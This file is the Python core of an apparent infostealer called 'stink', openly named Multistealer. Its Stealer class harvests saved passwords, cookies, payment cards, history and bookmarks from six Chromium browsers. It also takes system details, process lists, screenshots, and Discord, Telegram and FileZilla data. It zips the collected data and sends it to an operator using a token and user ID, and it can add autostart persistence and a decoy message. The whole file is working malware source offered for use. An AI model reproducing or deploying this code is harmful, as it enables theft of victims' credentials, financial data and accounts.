from sys import argv
from shutil import rmtree
from threading import Thread
from os import path, makedirs
from multiprocessing import Pool

from stink.helpers import functions
from stink.enums import Features, Utils
from stink.utils import Autostart, Sender, Message
from stink.helpers.config import MultistealerConfig
from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram


class Stealer(Thread):

    def __init__(self, token: str, user_id: int, features: list = [Features.all], utils: list = []):
        Thread.__init__(self, name="Stealer")

        self.token = token
        self.user_id = user_id
        self.errors = True if Utils.errors in utils else False
        self.autostart = True if Utils.autostart in utils else False
        self.message = True if Utils.message in utils else False

        self.config = MultistealerConfig()

        browser_functions = [module for module in [
            Features.passwords,
            Features.cookies,
            Features.cards,
            Features.history,
            Features.bookmarks
        ] if module in features or Features.all in features]
        browser_statuses = True if len(browser_functions) > 0 else False

        self.methods = [
            {
                "object": Chromium(
                    "Chrome",
                    self.config.StoragePath,
                    *self.config.ChromePaths,
                    browser_functions,
                    self.errors
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium(
                    "Opera GX",
                    self.config.StoragePath,
                    *self.config.OperaGXPaths,
                    browser_functions,
                    self.errors
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium(
                    "Opera Default",
                    self.config.StoragePath,
                    *self.config.OperaDefaultPaths,
                    browser_functions,
                    self.errors
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium(
                    "Edge",
                    self.config.StoragePath,
                    *self.config.MicrosoftEdgePaths,
                    browser_functions,
                    self.errors
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium(
                    "Brave",
                    self.config.StoragePath,
                    *self.config.BravePaths,
                    browser_functions,
                    self.errors
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium(
                    "Vivaldi",
                    self.config.StoragePath,
                    *self.config.VivaldiPaths,
                    browser_functions,
                    self.errors
                ),
                "status": browser_statuses
            },
            {
                "object": System(
                    self.config.StoragePath,
                    "System",
                    self.errors
                ),
                "status": True if (Features.system in features or Features.all in features) else False
            },
            {
                "object": Processes(
                    self.config.StoragePath,
                    "System",
                    self.errors
                ),
                "status": True if (Features.processes in features or Features.all in features) else False
            },
            {
                "object": Screenshot(
                    self.config.StoragePath,
                    "System",
                    self.errors
                ),
                "status": True if (Features.screenshot in features or Features.all in features) else False
            },
            {
                "object": Discord(
                    self.config.StoragePath,
                    r"Programs\Discord",
                    self.errors
                ),
                "status": True if (Features.discord in features or Features.all in features) else False
            },
            {
                "object": Telegram(
                    self.config.StoragePath,
                    r"Programs\Telegram",
                    self.errors
                ),
                "status": True if (Features.telegram in features or Features.all in features) else False
            },
            {
                "object": FileZilla(
                    self.config.StoragePath,
                    r"Programs\FileZilla",
                    self.errors
                ),
                "status": True if (Features.filezilla in features or Features.all in features) else False
            }
        ]

    def __create_storage(self):

        if not path.exists(self.config.StoragePath):
            makedirs(self.config.StoragePath)
        else:
            rmtree(self.config.StoragePath)
            makedirs(self.config.StoragePath)

    def run(self):

        try:

            self.__create_storage()

            with Pool(processes=self.config.PoolSize) as pool:
                pool.map(functions.run_process, [method["object"] for method in self.methods if method["status"] is True])

            Sender(self.config.ZipName, self.config.StoragePath, self.token, self.user_id, self.errors).run()

            if self.autostart is True:
                Autostart(argv[0], self.errors).run()

            if self.message is True:
                Message(self.errors).run()

        except Exception as e:
            if self.errors is True: print(f"[Multistealer]: {repr(e)}")
